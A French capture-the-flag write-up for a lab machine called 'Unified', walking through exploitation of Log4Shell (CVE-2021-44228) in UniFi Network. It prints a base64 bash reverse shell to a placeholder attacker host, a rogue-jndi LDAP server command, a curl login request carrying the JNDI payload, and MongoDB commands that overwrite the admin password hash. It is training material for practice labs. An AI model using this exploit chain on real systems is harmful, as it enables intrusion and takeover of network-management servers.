@@ -1,0 +1,211 @@
+---
+title: Unified
+description: WU Unified
+categories: [Writeup]
+tags: [writeup]
+template: doc
+sidebar:
+  order: 5
+  badge:
+    text: 'very easy'
+    variant: success
+---
+
+| OS | Difficulty | Target |
+|----|----|----|
+| Linux | <span style="color:green">**VERY EASY**</span> | 10.129.x.x |
+
+## Résumé
+
+Machine Linux avec UniFi Network Application vulnérable à Log4Shell (CVE-2021-44228). Exploitation via injection JNDI pour obtenir un shell, puis accès à MongoDB pour modifier les credentials admin. Récupération du mot de passe root dans les paramètres du site UniFi.
+
+---
+
+## Reconnaissance
+
+### Scan de ports
+
+```bash
+nmap -T4 <IP>
+```
+
+```shell wrap
+PORT     STATE SERVICE
+22/tcp   open  ssh
+6789/tcp open  ibm-db2-admin
+8080/tcp open  http-proxy
+8443/tcp open  https-alt
+```
+
+### Scan détaillé
+
+```bash
+nmap -A -p 22,6789,8080,8443 <IP>
+```
+
+| Port | Service | Version |
+|------|---------|---------|
+| 22 | SSH | OpenSSH 8.2p1 Ubuntu |
+| 6789 | UniFi Inform | - |
+| 8080 | HTTP | Apache Tomcat (redirige vers 8443) |
+| 8443 | HTTPS | UniFi Network |
+
+---
+
+## Enumération
+
+### UniFi Network (8443)
+
+Accès à `https://<IP>:8443/manage/account/login`
+
+Identifier la version du logiciel dans l'interface de connexion.
+
+### Recherche de vulnérabilités
+
+UniFi Network < 6.5.54 est vulnérable à Log4Shell (CVE-2021-44228).
+
+---
+
+## Exploitation
+
+### Log4Shell (CVE-2021-44228)
+
+La vulnérabilité permet l'exécution de code via injection JNDI dans les champs de connexion.
+
+### Installation de rogue-jndi
+
+```bash
+# Installer Maven (macOS)
+brew install maven
+
+# Cloner et compiler
+git clone https://github.com/veracode-research/rogue-jndi.git
+cd rogue-jndi
+mvn package
+```
+
+Le JAR compilé se trouve dans `target/RogueJndi-1.1.jar`.
+
+### Génération du payload
+
+```bash
+echo 'bash -c bash -i >&/dev/tcp/<ATTACKER_IP>/4444 0>&1' | base64
+```
+
+### Lancement du serveur LDAP malveillant
+
+```shell wrap
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,<BASE64_PAYLOAD>}|{base64,-d}|{bash,-i}" --hostname <ATTACKER_IP>
+```
+
+### Listener
+
+```bash
+nc -lvn 4444
+```
+
+### Déclenchement de l'exploit
+
+```shell wrap
+curl -k -X POST https://<IP>:8443/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"admin","remember":"${jndi:ldap://<ATTACKER_IP>:1389/o=tomcat}","strict":true}'
+```
+
+Interception du callback LDAP visible dans Wireshark/tcpdump sur le port 389.
+
+### Vérification du callback LDAP
+
+Les captures Wireshark montrent le callback LDAP de la cible vers l'attaquant (paquet TCP SYN de la cible vers l'attaquant sur le port 389).
+
+Shell obtenu en tant que `unifi`.
+
+---
+
+## Post-exploitation
+
+### Enumération MongoDB
+
+Trouver le port MongoDB :
+
+```bash
+ps aux | grep mongo
+```
+
+Connexion à MongoDB :
+
+```bash
+mongo --port <PORT>
+```
+
+### Base de données UniFi
+
+```javascript
+show dbs
+use ace
+show collections
+```
+
+### Enumération des utilisateurs
+
+```javascript
+db.admin.find().forEach(printjson)
+```
+
+Les utilisateurs avec leurs hashes SHA-512 (x_shadow) sont listés.
+
+### Modification du mot de passe admin
+
+Générer un nouveau hash :
+
+```bash
+mkpasswd -m sha-512 <nouveau_password>
+```
+
+Mettre à jour dans MongoDB :
+
+```javascript
+db.admin.update({"name":"administrator"},{$set:{"x_shadow":"<NOUVEAU_HASH>"}})
+```
+
+---
+
+## Escalade de privilèges
+
+### Accès au panel UniFi
+
+Se connecter à `https://<IP>:8443` avec les nouveaux credentials.
+
+### Récupération du mot de passe root
+
+Dans les paramètres du site UniFi, rechercher les informations de connexion SSH configurées.
+
+Le mot de passe root est stocké en clair dans la configuration.
+
+### Connexion SSH
+
+```bash
+ssh root@<IP>
+```
+
+---
+
+## Flags
+
+```bash
+cat /home/michael/user.txt
+cat /root/root.txt
+```
+
+---
+
+## A retenir
+
+- Log4Shell (CVE-2021-44228) affecte de nombreuses applications Java
+- Le protocole JNDI peut être exploité via LDAP pour exécuter du code
+- Utiliser tcpdump pour vérifier les callbacks LDAP
+- MongoDB UniFi utilise souvent un port non standard
+- La base `ace` contient les utilisateurs UniFi
+- `db.admin.find()` pour énumérer, `db.admin.update()` pour modifier
+- Les credentials SSH peuvent être stockés dans les configurations d'application
+- Référence : [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
